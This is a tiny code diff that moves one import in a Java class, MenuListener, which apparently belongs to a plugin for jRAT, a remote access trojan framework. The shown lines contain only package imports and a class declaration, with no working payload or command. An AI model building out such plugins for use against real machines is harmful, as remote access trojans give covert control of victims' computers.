@@ -10,9 +10,9 @@ import java.util.List;
 
 import javax.swing.JFrame;
 
-import jrat.api.BaseControlPanel;
 import jrat.api.Client;
 import jrat.api.net.PacketBuilder;
+import jrat.api.ui.BaseControlPanel;
 import jrat.api.ui.RATMenuItemActionListener;
 
 public class MenuListener implements RATMenuItemActionListener {
